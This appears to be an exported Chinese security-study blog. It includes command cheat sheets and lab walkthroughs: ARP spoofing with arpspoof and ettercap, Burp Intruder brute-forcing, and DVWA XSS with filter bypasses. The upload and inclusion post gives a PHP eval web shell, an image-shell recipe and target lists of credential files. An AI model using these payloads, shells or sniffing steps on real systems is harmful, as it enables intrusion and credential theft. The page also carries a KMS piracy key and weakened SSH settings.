    <content type="text"><![CDATA[Linux系统下基本命令： （区分大小写 ）uname 显示版本信息（同win2K的 ver ）dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）pwd 查询当前所在的目录位置cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。cat 文件名 查看文件内容cat &gt;abc.txt 往abc.txt文件中写上内容。more 文件名 以一页一页的方式显示一个文本文件。cp 复制文件mv 移动文件rm 文件名 删除文件，rm -a 目录名删除目录及子目录mkdir 目录名 建立目录rmdir 删除子目录，目录内没有文档。chmod 设定档案或目录的存取权限grep 在档案中查找字符串diff 档案文件比较find 档案搜寻date 现在的日期、时间who 查询目前和你使用同一台机器的人以及Login时间地点w 查询目前上机者的详细资料whoami 查看自己的帐号名称groups 查看某人的Grouppasswd 更改密码history 查看自己下过的命令ps 显示进程状态kill 停止某进程gcc 黑客通常用它来编译C语言写的文件su 权限转换为指定使用者telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。ftp ftp连接上某服务器（同win2K） windows 系统命令大全常用的CMD命令：cd 改变当前目录cls 清屏copy 拷贝文件del 删除文件deltree 删除目录树dir 列文件名diskcopy 复制磁盘edit 文本编辑format 格式化磁盘md 建立子目录more 分屏显示move 移动文件、改目录名rd 删除目录ren 改变文件名echo 内容 &gt; 文件名 创建新文件type 显示文件内容xcopy 拷贝目录与文件attrib 设置文件属性chkdsk 检查磁盘date 显示及修改日期defrag 磁盘碎片整理doskey 重新调用DOS命令emm386 扩展内存管理fdisk 硬盘分区help 帮助label 设置卷标号path 设置搜寻目录prempt 设置提示符restore 恢复备份文件time 显示及修改时间scandisk检测、修理磁盘set 设置环境变量smartdrv设置磁盘加速器undelete恢复被删的文件append 设置非执行文件路径debug 随机调试程序diskcomp磁盘比较expand 还原DOS文件fasthelp快速显示帮助信息fc 文件比较interink启动服务器intersvr启动客户机qbasic Basic集成环境setver 设置版本share 文件共享subst 路径替换tree 列目录树unformat恢复已格式化的磁盘vsafe 防病毒ver 显示DOS版本号vol 显示磁盘卷标号ctty 改变控制设备nbtstat 该命令使用TCP/IP上的NetBIOS显示协议统计和当前TCP/IP连接，使用这个命令你可以得到远程主机的NETBIOS信息 计算机运行命令全集winver———检查Windows版本wmimgmt.msc—-打开windows管理体系结构wupdmgr——–windows更新程序winver———检查Windows版本wmimgmt.msc—-打开windows管理体系结构wupdmgr——–windows更新程序wwww——–windows脚本宿主设置write———-写字板winmsd—–系统信息wiaacmgr——-扫描仪和照相机向导winchat——–XP自带局域网聊天mem.exe——–显示内存使用情况Msconfig.exe—系统配置实用程序mplayer2——-简易widnows media playermspaint——–画图板mstsc———-远程桌面连接mplayer2——-媒体播放机magnify——–放大镜实用程序mmc————打开控制台mobsync——–同步命令dxdiag———检查directx信息drwtsn32—— 系统医生devmgmt.msc— 设备管理器dfrg.msc——-磁盘碎片整理程序diskmgmt.msc—磁盘管理实用程序dcomcnfg——-打开系统组件服务ddeshare——-打开DDE共享设置dvdplay——–DVD播放器net stop messenger—–停止信使服务net start messenger—-开始信使服务notepad——–打开记事本nslookup——-网络管理的工具向导ntbackup——-系统备份和还原narrator——-屏幕”讲述人”ntmsmgr.msc—-移动存储管理器ntmsoprq.msc—移动存储管理员操作请求netstat -an—-(TC)命令检查接口syncapp——–创建一个公文包sysedit——–系统配置编辑器sigverif——-文件签名验证程序sndrec32——-录音机shrpubw——–创建共享文件夹secpol.msc—–本地安全策略syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码services.msc—本地服务设置Sndvol32——-音量控制程序sfc.exe——–系统文件检查器sfc /scannow—windows文件保护tsshutdn——-60秒倒计时关机命令tourstart——xp简介（安装完成后出现的漫游xp程序）taskmgr——–任务管理器eventvwr——-事件查看器eudcedit——-造字程序explorer——-打开资源管理器packager——-对象包装程序perfmon.msc—-计算机性能监测程序progman——–程序管理器regedit.exe—-注册表rsop.msc——-组策略结果集regedt32——-注册表编辑器rononce -p —-15秒关机regsvr32 /u *.dll—-停止dll文件运行regsvr32 /u zipfldr.dll——取消ZIP支持cmd.exe——–CMD命令提示符chkdsk.exe—–Chkdsk磁盘检查certmgr.msc—-证书管理实用程序calc———–启动计算器charmap——–启动字符映射表cliconfg——-SQL SERVER 客户端网络实用程序Clipbrd——–剪贴板查看器conf———–启动netmeetingcompmgmt.msc—计算机管理cleanmgr——-**整理ciadv.msc——索引服务程序osk————打开屏幕键盘odbcad32——-ODBC数据源管理器oobe/msoobe /a—-检查XP是否激活lusrmgr.msc—-本机用户和组logoff———注销命令iexpress——-木马捆绑工具，系统自带Nslookup——-IP地址侦测器fsmgmt.msc—–共享文件夹管理器utilman——–辅助工具管理器gpedit.msc—–组策略]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows使用问题]]></title>
    <url>%2F2018%2F04%2F22%2Foffice%2F</url>
    <content type="text"><![CDATA[office的问题Office打开文件问题解决此问题，先左击该文件，再右击属性，右下角文件属性，解除锁定 问题解决 两行文字之间有空白段PDF转为word的文件，两行文字之间有空白段，但是按删除键却删除不了，这是由于文档中插入了分页符，我们需要删除分页符 删除分页符方法：第三步处，鼠标移至分页符前面按下Delete键即可删除此段空白 windows管理员权限删除文件依然删除不掉电脑在开机状态下按shift键，选择重启，开机进入高级选项模式，进入命令行模式，使用命令删除此类文件rd /s /q 文件夹del /F /S /Q 文件夹]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[arp欺骗]]></title>
    <url>%2F2018%2F04%2F22%2Farp%2F</url>
    <content type="text"><![CDATA[ARPARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。 ARP原理某机器A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。网上所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的。 ARP欺骗在局域网中，黑客经过收到ARP Request广播包，能够偷听到其它节点的 (IP, MAC) 地址, 黑客就伪装为A，告诉B (受害者) 一个假地址，使得B在发送给A 的数据包都被黑客截取；ARP欺骗是局域网中常用的攻击手段，其目的是对局域网中的目标机数据包进行转发，以实现中间人攻击，进而对数据监听、重放、钓鱼等攻击。 ARP实战在kali虚拟机下进行练习本机IP查看局域网中哪些主机在线fping -asg 192.168.231.0/24（局域网的网段）使用arpspoof工具进行欺骗，arpspoof -h，输入arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1arpspoof -i 攻击机网卡 -t 目标主机IP 目标主机网关。此时目标机已经断网。ctrl+c停止断网攻击。 ARP欺骗linux默认不支持ip转发，修改配置文件以开启流量转发echo 1 &gt;/proc/sys/net/ipv4/ip_dorward依然使用ARPSpoof工具，输入arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1开始欺骗，接下来使用ettercap嗅探工具来抓取http协议上的登录账户和密码ettercap -Tq -i eth0 进行图片获取使用Driftnet -i eth0]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Wireless security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Brute_Force]]></title>
    <url>%2F2018%2F04%2F21%2FBrute-Force%2F</url>
    <content type="text"><![CDATA[首先来认识下Burp Suite Intruder的四种攻击类型： Sniper（狙击手模式）这个模式使用单一的payload组。它会针对每个位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行fuzzing测试。攻击中的请求总数应该是position数量和payload数量的乘积。 Battering ram（攻城锤模式）这一模式使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。 Pitchfork（草叉模式）这一模式使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量。 Cluster bomb（集束炸弹模式）这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 DVWA下的Brute Force模块随便登录一个账号，记下报错码打开BurpSuite，抓包开始爆破Ctrl+I发送到Intruder模块，选择攻击类型，此处为了爆破账户名和密码，选择Cluster bomb模式，选中要进行爆破的字段内容在Payloads选项卡下面，设置set：1的list，可以自定义，也可以使用BurpSuite自带的字段，set：2设置密码字段，可以在simple list里面用load使用本地密码字典复制刚刚的报错信息到Options选项卡里面，在Grep-Match里面Add一下准备工作到此结束，可以开始攻击了，点击Start attack,根据Length的不同，找出有效的Payload，在response里面查看一下，成功了，大功告成]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA系列之XSS]]></title>
    <url>%2F2018%2F04%2F19%2Fxss%2F</url>
    <content type="text"><![CDATA[前期准备：linux下搭建dvwa需要lamp环境，其php版本不能太高，php7.0无法使用，php5.6可以; XSS定义CSS(Cross Site Script)又叫XSS,中文意思：跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行。XSS的攻击目标是为了盗取客户端的cookie或者其他网站用于识别客户端身份的敏感信息。获取到合法用户的信息后，攻击者甚至可以假冒最终用户与网站进行交互。 XSS的原理也就是往HTML中注入脚本，HTML指定了脚本标记.在没有过滤字符的情况下，只需要保持完整无错的脚本标记即可触发XSS，假如我们在某个资料表单提交内容,表单提交内容就是某个标记属性所赋的值，我们可以构造如下值来闭和标记来构造完整无错的脚本标记，&quot;&gt;&lt;script&gt;alert(&#39;Xss&#39;);&lt;/script&gt;&lt;&quot; 反射型XSS等级Low源代码12345678910&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 这里随便输入Word试一下：word&lt;script&gt;alert(&#39;Xss&#39;);&lt;/script&gt; ;观察到调用函数输出了Xss弹窗,后面为Word,其实”注入语句“可以完成许多功能。 等级Medium源代码：12345678910111213&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 观察发现使用str_replace进行了黑名单过滤，绕过这个不成问题，使用 双写绕过&lt;scri&lt;script&gt;pt&gt;alert(/test/);&lt;/script&gt; 大小写混写绕过&lt;sCripT&gt;alert(/test/);&lt;/script&gt; 等级High1234567891011&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 使用正则进行匹配，过滤了大小写混合写入已经双写，但是可以使用img、body等标签的事件以及iframe标签的src注入恶意的js代码进行漏洞利用&lt;img src=1 onerror=alert(&#39;test&#39;)&gt; 等级Impossible源代码:12345678910111213&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。以防止浏览器将其作为HTML元素。这样会将用户输入的内容都不作为标签以提高安全性。预定义的字符是： &amp; （和号）成为 &amp;amp; &quot; （双引号）成为 &amp;quot; &apos; （单引号）成为 &apos; &lt; （小于）成为 &amp;lt; &gt; （大于）成为 &amp;gt; 一些常用的xss语句12345678&lt;script&gt;alert(/test/)&lt;/script&gt; 最普通的xss代码&lt;script&gt;alert(document.cookie);&lt;/script&gt; 获取cookie&lt;img src=&quot;javascript:alert(/test/)&quot;&gt; img链接地址xss&lt;script src=&quot;test.js&quot;&gt; &lt;script&gt; 外部调用攻击代码ls.js&lt;script alert(&apos;test)&lt;/SCRIPT&gt; 注释方法防止过滤&lt;img src=&quot;&quot; onerror=alert(&quot;xss&quot;)&gt; 加载图像失败执行&lt;iframe onload=alert(&apos;test&apos;)&gt; 框架&lt;script&gt;location=&apos;test.com&apos;;&lt;/script&gt; 跳转某页面 存储型XSS等级Low源代码:123456789101112131415161718192021&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitize name input $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 部分函数讲解trim() 函数移除字符串两侧的空白字符或其他预定义字符。相关函数： ltrim() - 移除字符串左侧的空白字符或其他预定义字符 rtrim() - 移除字符串右侧的空白字符或其他预定义字符 stripslashes()：删除由 addslashes() 函数添加的反斜杠。该函数用于清理从数据库或 HTML 表单中取回的数据。(若是连续二个反斜杠，则去掉一个，保留一个；若只有一个反斜杠，就直接去掉。)；mysqli_real_escape_string：转义字符串中的特殊字符； name栏输入发现有字数限制，那就抓包改数据；message栏正常输入即可，&lt;script&gt;alert(&#39;test&#39;);&lt;/script&gt; 等级Medium源代码：1234567891011121314151617181920212223&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 部分函数讲解函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用``标签。1234567891011121314151617181920212223242526272829303132```addslashes()``` 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。其对message参数使用了`htmlspecialchars`函数进行编码，因此无法对message参数注入XSS代码，但是对于name参数，简单过滤了`&lt;script&gt;`字符串，仍然存在存储型的XSS。使用双写`&lt;scri&lt;script&gt;pt&gt;alert(&apos;test&apos;)`![改包](https://upload-images.jianshu.io/upload_images/9464729-3a7307e13813a512.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)成功弹框![medium](https://upload-images.jianshu.io/upload_images/9464729-619ffba35aee9ede.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)大小写混合绕过`&lt;sCrIpt&gt;alert(&apos;test&apos;)`##### 等级High源代码：```php&lt;?phpif( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123; // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close();&#125;?&gt; 这里使用正则表达式过滤了&lt;script&gt;标签，但是依然存在img、iframe等其它危险的标签，因此name参数仍然有存储型XSS抓包改name数据=&lt;img src=1 onerror=alert(&#39;test&#39;)&gt;成功弹框 等级Impossible源代码：1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这个就比较高级了，对name和message均进行了htmlspecialchars过滤 存储型和反射型的区别 存储型存储型XSS，持久型，代码是存储在服务器中的，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。 反射型反射型XSS，非持久化，需要欺骗用户手动去点击链接才能触发XSS代码，一般容易出现在搜索页面。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win resystem]]></title>
    <url>%2F2018%2F04%2F19%2Fsystem%2F</url>
    <content type="text"><![CDATA[首先要有一个U盘启动盘或者装机光盘； 一、安装Win10，按Esc进入BIOS设置两项， Launch CSm关闭 Security Boot选择Disable修改完成后按F10保存并退出接下来就该修改磁盘格式为GPT格式了，进入安装界面时按住Shift+F10，进入命令行， 首先输入diskpart 进入磁盘操作界面list disk 查看磁盘名及类型select disk 0 清除磁盘格式clean 安装win10需要格式化为gpt格式convert gpt 格式化完成后进行分区create paraition 创建EFI分区，执行create partition efi size=200（分区大小为200MB） 创建MSR分区，执行create partition msr size=200（微软系统保留分区） 创建主分区，执行create partition primary size=xxx（具体大小根据你的要求而定，作为系统分区来说，如果有足够空间，可以留出大于100GB即102400MB的空间，命令为create partition primary size=102400，方便系统有足够周转空间） 如果还有剩余空间，可继续重复执行上述命令来创建新的分区（注意修改具体数值）。但建议用户创建完系统分区后就退出命令提示符继续安装系统，毕竟这种方式不容易估算剩下的硬盘空间大小，进入安装程序后可以进一步划分剩余空间，也可以在安装结束后，进入系统磁盘管理中进行分配 企业版win10激活方法，鼠标右击win键，点击Windows Powershell（管理员），依次输入一下命令，如若序列号不可使用，请百度最新win10企业版序列号替换即可，也可以使用Windows激活工具进行激活/upk123slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43slmgr /skms zh.us.toslmgr /ato 二、安装Win7听说现在新版电脑不再支持安装Win7了，当然如果你的电脑支持安装Win7，最好不过了。按Esc进入Bios 修改Lanuch CMS为Enable Security Boot选择Disable修改完成后按F10保存并退出接下来就该修改磁盘格式了，进入安装界面时按住Shift+F10，进入命令行， 首先输入diskpart 进入磁盘操作界面list disk 查看磁盘名及类型select disk 0 清除磁盘格式clean 安装win7需要格式化为MBR格式convert mbr操作完成后输入exit退出到选择安装系统到哪个磁盘时再进行分区，这是Win7与Win10的不同，分多内存看自己电脑磁盘空间大小，C盘建议分100GB即可，此时电脑会自动分出100MB内存给系统默认分区，选择系统盘时选择自己刚刚创建的100GB的分区就可以，其它剩余的内存安装好系统后进去磁盘管理再分区会更加方便。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali]]></title>
    <url>%2F2018%2F04%2F11%2Fkali%2F</url>
    <content type="text"><![CDATA[kali2018-1安装官网下载:https://www.kali.org/downloads/出处http://www.weixianmanbu.com/article/2336.html Vmtools问题成功安装Vmtools后仍然无法使用文件复制粘贴，(在2016 rolling版本后遗弃了vmtools)就放弃了Vmtools，改用open-vmtools先改kali源vi /etc/apt/sources.list中科大更新源 123deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali/ kali-rolling main contrib non-free 然后apt-get install open-vm-tools-desktop fuse再reboot即可 mysql任意密码登录问题mysql -u root，进入mysql，输入12GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;youpassword&apos; WITH GRANT OPTION; #youpassword你的新密码flush privileges; #刷新一下 配置ssh远程登录一、修改ssh配置1、修改sshd_config文件，命令为：vi /etc/ssh/sshd_config将#PasswordAuthentication no的注释去掉，参数为yes2、将PermitRootLogin without-password修改为PermitRootLogin yes保存，退出vim二、启动ssh服务命令为：/etc/init.d/ssh start或者service ssh start查看SSH服务状态是否正常运行，命令为：/etc/init.d/ssh status或者service ssh status如有其他问题可参考https://jingyan.baidu.com/article/eae07827a3e6bc1fec5485e3.html 配置ssh免密修改sshd_config 文件， 将#PasswordAuthentication yes的注释（“#”号）去掉，然后保存退出vim /etc/ssh/sshd_config生成密钥ssh-keygen -t rsa追加文件cat id_rsa.pub &gt;&gt; authorized_keys修改文件权限chmod 600 authorized_keyscd /root/.ssh/lsauthorized.keys id_rsa id_rsa.pub known_hosts将ssh服务加入开机自启update-rc.d ssh enable]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2018%2F04%2F09%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[上传文件校验 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定 php文件上传过程黑名单、白名单认证此文可以参考https://blog.csdn.net/hitwangpeng/article/details/47060671黑名单绕过可以测试，如1.aaa，1.php3,1.php4等进行测试 文件上传漏洞Burpsuite改包 0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 上传文件为1.php，在burpsuite将其改为1.php+，发送到repeate，+号的十六进制为2d，在hex里面将其改为00，截断，点GO 上传文件为1.php.jpg，将jpg前面的.的十六进制（2e）改为00 上传一句话木马，1.php；&lt;?php eval($_POST[&quot;xxx&quot;]);?&gt;，在Burpsuite里面将其文件名改为1.jpg，还有将content-type字段改为image/jpg； 图片木马 Windows下制作图片一句话木马php写入图片copy 1.jpg/b+2.php/a New.jpg Linux下cat 1.jpg 2.php &gt; new.jpg点击上传，http://localhost/upload/upload.html上传成功后，使用文件包含程序，将jpg文件进行解析http://localhost/upload/1.php?page=./uploads/h.jpg?paragam(参数)=图片的绝对路径此时上传成功，php程序一句被即解析，本页面只会显示图片的源码，而不显示php程序，此时查看源代码php程序已经被注释接下来可以使用菜刀连接&nbsp;刚刚的网址，密码是php程序里面写入的参数1.php 12345678&lt;?php if(isset($_GET[&quot;page&quot;]))&#123; include $_GET[&quot;page&quot;]; &#125;else&#123; include &apos;2.php&apos;; &#125;?&gt; 2.php123&lt;?php echo &quot;niaho&quot;;?&gt; 敏感文件：1、Windows：C:boot.ini //查看系统版本C:WindowsSystem32inetsrvMetaBase.xml //IIS配置文件C:Windowsrepairsam //存储系统初次安装的密码C:Program Filesmysqlmy.ini //Mysql配置C:Program Filesmysqldatamysqluser.MYD //Mysql rootC:Windows\php.ini //php配置信息C:Windows\my.ini //Mysql配置信息 2、Linux：/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/my.cnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts/porc/config.gz ###文件包含漏洞详解，转自https://blog.csdn.net/chence19871/article/details/51906523web安全文件包含漏洞，转自https://blog.csdn.net/hitwangpeng/article/details/45952625绕过姿势https://thief.one/2017/04/10/2/https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh远程连接Linux]]></title>
    <url>%2F2018%2F04%2F07%2F%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Linux%2F</url>
